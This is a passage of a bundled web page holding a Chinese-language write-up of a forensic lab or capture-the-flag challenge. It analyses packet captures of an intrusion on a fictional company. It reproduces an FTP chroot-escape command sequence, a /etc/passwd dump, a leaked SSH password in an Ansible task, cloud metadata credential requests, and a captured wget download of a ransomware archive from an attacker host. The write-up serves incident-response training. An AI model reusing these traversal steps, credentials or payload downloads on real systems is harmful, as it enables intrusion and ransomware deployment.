\u6587\u4ef6\uff0c\u63d0\u53d6\u4e4b\u540e\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u56fe\u8868"]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"Done.docx \u56fe\u8868",src:s(7687).Z+"",width:"750",height:"438"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"30/08/2023\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-15",children:"Task 15"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"Forela \u516c\u53f8\u7684 CEO \u8ba1\u5212\u4f55\u65f6\u62b5\u8fbe\u5df4\u57fa\u65af\u5766\uff1f"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u5728 ftp \u4f20\u8f93\u7684\u6587\u4ef6\u4e2d\uff0c\u53d1\u73b0\u6709\u4e00\u4e2a ",(0,a.jsx)(n.code,{children:"reminder.txt"})," \u6587\u4ef6\uff0c\u63d0\u53d6\u4e4b\u540e\u53ef\u4ee5\u5f97\u5230"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"I am so stupid and dump, i keep forgetting about Forela CEO Happy grunwald visiting Pakistan to start the buisness operations\nhere.I have so many tasks to complete so there are no problems once the Forela Office opens here in Lahore. I am writing this\nnote and placing it on all my remote servers where i login almost daily, just so i dont make a fool of myself and get the\nurgent tasks done.\n\nHe is to arrive in my city on 8 march 2023 :))\n\ni am finally so happy that we are getting a physical office opening here.\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"08/03/2023\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-16",children:"Task 16"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsxs)(n.p,{children:["\u653b\u51fb\u8005\u80fd\u591f\u6267\u884c\u76ee\u5f55\u904d\u5386\u5e76\u9003\u79bb chroot \u76d1\u72f1\u3002\u8fd9\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u50cf\u666e\u901a\u7528\u6237\u4e00\u6837\u5728\u6587\u4ef6\u7cfb\u7edf\u4e2d\u6f2b\u6e38\u3002\u9664\u4e86 root \u4e4b\u5916\uff0c\u5177\u6709 ",(0,a.jsx)(n.code,{children:"/bin/bash"})," \u4f5c\u4e3a\u9ed8\u8ba4 Shell \u7684\u5e10\u6237\u7684\u7528\u6237\u540d\u662f\u4ec0\u4e48\uff1f"]}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u6839\u636e\u5c1d\u8bd5\uff0c\u8981\u83b7\u5f97\u4ee5\u4e0a\u4fe1\u606f\uff0c\u9700\u8981\u653b\u51fb\u8005\u53bb\u8bbf\u95ee ",(0,a.jsx)(n.code,{children:"/etc/passwd"})," \u6587\u4ef6\uff0c\u5728 ftp \u7684\u6d41\u91cf\u4e2d\u8fdb\u884c\u68c0\u7d22"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:102:105::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsyslog:x:104:111::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:113::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:114::/nonexistent:/usr/sbin/nologin\nsshd:x:109:65534::/run/sshd:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nlandscape:x:111:116::/var/lib/landscape:/usr/sbin/nologin\nfwupd-refresh:x:112:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\nec2-instance-connect:x:113:65534::/nonexistent:/usr/sbin/nologin\n_chrony:x:114:121:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\nlxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false\nabdullah.yasin:x:1001:1001::/home/abdullah.yasin:/bin/sh\ntony.shephard:x:1002:1002::/home/tony.shephard:/bin/sh\nftp:x:115:123:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\nredis:x:116:124::/var/lib/redis:/usr/sbin/nologin\nmysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false\npostfix:x:118:126::/var/spool/postfix:/usr/sbin/nologin\ninfluxdb:x:119:65534::/var/lib/influxdb:/usr/sbin/nologin\ncyberjunkie:x:1003:1003:,,,:/home/cyberjunkie:/bin/bash\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"cyberjunkie\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-17",children:"Task 17"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u5bfc\u81f4\u653b\u51fb\u8005\u83b7\u5f97\u5bf9\u670d\u52a1\u5668\u7684 ssh \u8bbf\u95ee\u6743\u9650\u7684\u6587\u4ef6\u7684\u5b8c\u6574\u8def\u5f84\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"\u5bf9\u653b\u51fb\u8005\u4e0e ftp \u8fdb\u884c\u4ea4\u4e92\u7684\u64cd\u4f5c\u6307\u4ee4\u8fdb\u884c\u8ffd\u8e2a\u6574\u7406\uff0c\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u8005\u6267\u884c\u4e86\u4ee5\u4e0b\u6307\u4ee4"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"CWD ../\nTYPE A\nEPSV\nLIST -la\nCWD ../\nEPSV\nLIST -la\nCWD opt\nEPSV\nLIST -la\nEPSV\nNLST\nCWD reminders\nEPSV\nLIST -la\nEPSV\nNLST\nTYPE I\nSIZE .reminder\nEPSV\nRETR .reminder\nMDTM .reminder\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"/opt/reminders/.reminder\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-18",children:"Task 18"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u653b\u51fb\u8005\u7528\u4e8e\u8bbf\u95ee\u670d\u52a1\u5668\u5e76\u83b7\u53d6\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\u7684 SSH \u5bc6\u7801\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u67e5\u770b ftp \u6d41\u91cf\u4e2d ",(0,a.jsx)(n.code,{children:"reminder"})," \u6587\u4ef6\u4e2d\u7684\u8bf4\u660e\u4fe1\u606f"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"A reminder to clean up the github repo. Some sensitive data could have been leaked from there\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u4f7f\u7528\u4ee5\u4e0b\u5173\u952e\u8bcd\uff0c\u5728 Google \u8fdb\u884c\u641c\u7d22"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"site:github.com \u200b\u200bforela\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u627e\u5230\u8fd9\u4e2a Github repo\uff1a",(0,a.jsx)(n.a,{href:"https://github.com/forela-finance/forela-dev/",children:"forela-finance / forela-dev"})]}),"\n",(0,a.jsxs)(n.p,{children:["\u5728\u50a8\u5b58\u5e93\u7684\u5386\u53f2\u63d0\u4ea4\u4e2d\uff0c\u627e\u5230 ",(0,a.jsx)(n.a,{href:"https://github.com/forela-finance/forela-dev/commit/182da42155d49211abc628c01afe8bda5ab8fcae",children:"commit 182da42"})," \u4e2d\u5305\u542b\u4ee5\u4e0b\u654f\u611f\u4fe1\u606f"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-xml",children:"tasks:\n- name: Log in to remote server via SSH\n    become_user: root\n    become_method: sudo\n    vars:\n    ssh_user: cyberjunkie\n    ssh_password: YHUIhnollouhdnoamjndlyvbl398782bapd\n    shell: sshpass -p {{ssh_password}} ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {{ ssh_user }}@{{ inventory_hostname }} 'echo\"Logged in via SSH\"'\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"YHUIhnollouhdnoamjndlyvbl398782bapd\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-19",children:"Task 19"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u653b\u51fb\u8005\u4e0b\u8f7d\u52d2\u7d22\u8f6f\u4ef6\u7684\u5b8c\u6574 URL \u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u56de\u5230\u539f\u59cb\u7684\u6d41\u91cf\u5305\u6587\u4ef6\u4e2d\uff0c\u4f7f\u7528\u4ee5\u4e0b\u7b5b\u9009\u5668\u5bfc\u51fa\u7279\u5b9a\u5206\u7ec4\uff0c\u5c06\u53d7\u5bb3\u4e3b\u673a\u7684\u6d41\u91cf\u63d0\u53d6\u51fa\u6765\uff0c\u4fdd\u5b58\u4e3a ",(0,a.jsx)(n.code,{children:"3.pcap"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"ip.addr == 172.31.39.46\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u53ef\u4ee5\u731c\u6d4b\uff0c\u653b\u51fb\u8005\u7528\u6765\u6295\u653e\u52d2\u7d22\u8f6f\u4ef6\u7684\u65b9\u5f0f\uff0c\u662f\u901a\u8fc7 http \u534f\u8bae\u8fdb\u884c\u6295\u653e\uff0c\u4e8e\u662f\u53ef\u4ee5\u4f7f\u7528 tshark \u76f4\u63a5\u8fdb\u884c\u63d0\u53d6"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"$tshark -r Capture.pcap -T fields -Y \"ip.addr == 172.31.39.46 && http\" -e http.request.full_uri | sed '/^\\s*$/d' | sort | uniq\nhttp://13.233.179.35/PKCampaign/Targets/Forela/Ransomware2_server.zip\nhttp://169.254.169.254/latest/api/token\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-backports/InRelease\nhttp://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy/InRelease\nhttp://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/InRelease\nhttp://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/main/binary-amd64/by-hash/SHA256/036db7ea401f6a8baabe8d664e58d453c86efd6102fe1a9aeb8b737a17aff4de,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/universe/binary-amd64/by-hash/SHA256/d0465b04f6b1d7e17dd1af9b929d96827092178a7faba776a6e0768e60424d50,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/universe/i18n/by-hash/SHA256/0c6ba92182b6b1f3d77d0ccdf57c9c6c33d1d8e201e008d74f708aa0da31efd4,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/universe/cnf/by-hash/SHA256/97faf12ba5ec84e9143cc7e23395cc65b5a2364de57b42048bd3cbcd3a65ae43\nhttp://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/main/binary-amd64/by-hash/SHA256/b750a69409f259978d4621fa515b5b517f9b5483053c162ff88184912b9eb2b1,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/main/cnf/by-hash/SHA256/ef49512a6bea71ac7200f86629f43d6d42ef738e120a5783b3c8f591c7eb8baa,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/universe/binary-amd64/by-hash/SHA256/d43c8427e1b8959ca5768e4d3a98a28b7ebe7a22778a43e405cb1e6eb5f707b1,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/dists/jammy-updates/universe/cnf/by-hash/SHA256/8ab3721dfba09b0638c4ae3b665beafea8aeab781a1afdc5784db8937a87e0c8\nhttp://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/c/curl/curl_7.81.0-1ubuntu1.10_amd64.deb\nhttp://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/c/curl/libcurl3-gnutls_7.81.0-1ubuntu1.10_amd64.deb\nhttp://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/c/curl/libcurl4_7.81.0-1ubuntu1.10_amd64.deb\nhttp://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/p/python3.10/libpython3.10_3.10.6-1~22.04.2ubuntu1_amd64.deb\nhttp://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/p/python3.10/python3.10_3.10.6-1~22.04.2ubuntu1_amd64.deb,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/p/python3.10/libpython3.10-stdlib_3.10.6-1~22.04.2ubuntu1_amd64.deb,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/p/python3.10/python3.10-minimal_3.10.6-1~22.04.2ubuntu1_amd64.deb,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/p/python3.10/libpython3.10-minimal_3.10.6-1~22.04.2ubuntu1_amd64.deb,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/v/vim/vim_8.2.3995-1ubuntu2.4_amd64.deb,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/v/vim/vim-tiny_8.2.3995-1ubuntu2.4_amd64.deb,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/v/vim/vim-runtime_8.2.3995-1ubuntu2.4_all.deb,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/v/vim/xxd_8.2.3995-1ubuntu2.4_amd64.deb,http://ap-south-1.ec2.archive.ubuntu.com/ubuntu/pool/main/v/vim/vim-common_8.2.3995-1ubuntu2.4_all.deb\nhttp://freedomhouse.org/\nhttp://security.ubuntu.com/ubuntu/dists/jammy-security/InRelease\nhttp://security.ubuntu.com/ubuntu/dists/jammy-security/main/binary-amd64/by-hash/SHA256/ec306b867cbab332da874121ce3136550a7f9a936743c1041c22f08f6e5f6eb0\nhttp://security.ubuntu.com/ubuntu/dists/jammy-security/main/binary-amd64/by-hash/SHA256/f87dd0f78353885e2ca3a076c140b4cb8dea439c9e4697662b949af3ecdfc75e\nhttp://security.ubuntu.com/ubuntu/dists/jammy-security/main/cnf/by-hash/SHA256/4d596208dfa7f6067d00b1f8caf4435cdde390a891c62547d339302c978a0363,http://security.ubuntu.com/ubuntu/dists/jammy-security/universe/binary-amd64/by-hash/SHA256/31c71a5183c29e5a698e323fcbb326bad708c4d8fec6f6f4b03091d52725494c,http://security.ubuntu.com/ubuntu/dists/jammy-security/universe/cnf/by-hash/SHA256/75fedcff7f323ba1fd5ba250aa66d41672201ea7eb367e9b7e1eec8e7cac9927\nhttp://security.ubuntu.com/ubuntu/dists/jammy-security/main/i18n/by-hash/SHA256/84b120f9c8d1c1e9223cfc65ceddd5d19568c6bd8aa0d637375af27004fb896f,http://security.ubuntu.com/ubuntu/dists/jammy-security/universe/binary-amd64/by-hash/SHA256/6bdf67e1c6b56dc78ff85924da2ece8e8b2d764dae10351fedd36ae60137e587,http://security.ubuntu.com/ubuntu/dists/jammy-security/universe/i18n/by-hash/SHA256/8482930a283e7c0ecaf92fea95a917a62528ff8177a3ae35d71df0c3d486cf9d,http://security.ubuntu.com/ubuntu/dists/jammy-security/universe/cnf/by-hash/SHA256/2edba9e0d56d87e074af1b0b769b8d7ecf905ecfa9435d1e1da5c18be38da66b\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5728\u5176\u4e2d\u5c31\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u53ef\u7591\u7684\u538b\u7f29\u5305\u6587\u4ef6"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"http://13.233.179.35/PKCampaign/Targets/Forela/Ransomware2_server.zip\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-20",children:"Task 20"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u653b\u51fb\u8005\u7528\u4e8e\u4e0b\u8f7d\u52d2\u7d22\u8f6f\u4ef6\u7684\u5de5\u5177 / \u5b9e\u7528\u7a0b\u5e8f\u540d\u79f0\u548c\u7248\u672c\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"\u4f7f\u7528\u4ee5\u4e0b\u7b5b\u9009\u5668\u8fdb\u884c\u67e5\u8be2"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"ip.addr == 172.31.39.46 && http && ip.addr==13.233.179.35\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u67e5\u770b http \u8bf7\u6c42\u5934\u7684 ",(0,a.jsx)(n.code,{children:"user-agent"})," \u53c2\u6570\u5373\u53ef"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"GET /PKCampaign/Targets/Forela/Ransomware2_server.zip HTTP/1.1\nHost: 13.233.179.35\nUser-Agent: Wget/1.21.2\nAccept: */*\nAccept-Encoding: identity\nConnection: Keep-Alive\n"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"Wget/1.21.2\n"})}),"\n",(0,a.jsx)(n.h2,{id:"task-21",children:"Task 21"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u52d2\u7d22\u8f6f\u4ef6\u7684\u540d\u79f0\u662f\u4ec0\u4e48\uff1f"}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u5c06\u4f20\u8f93\u7684\u538b\u7f29\u5305\u6570\u636e\u63d0\u53d6\u51fa\u6765\uff0c\u4f7f\u7528 ",(0,a.jsx)(n.code,{children:"binwalk"})," \u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0 ",(0,a.jsx)(n.code,{children:"README.md"})," \u6587\u4ef6"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="Answer"',children:"GonnaCry\n"})})]})}function h(e={}){const{wrapper:n}={...(0,t.a)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(o,{...e})}):o(e)}},1353:(e,n,s)=>{s.d(n,{Z:()=>a});const a=s.p+"assets/images/image_20240112-121222-bfb236526740c92a07ae2bdf36f5cadc.png"},7687:(e,n,s)=>{s.d(n,{Z:()=>a});const a=s.p+"assets/images/image_20240132-153228-4f20a9d25cc955fd3c5568adacfd3998.png"},1151:(e,n,s)=>{s.d(n,{Z:()=>r,a:()=>c});var a=s(7294);const t={},i=a.createContext(t);function c(e){const n=a.useContext(i);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:c(e.components),a.createElement(i.Provider,{value:n},e.children)}}}]);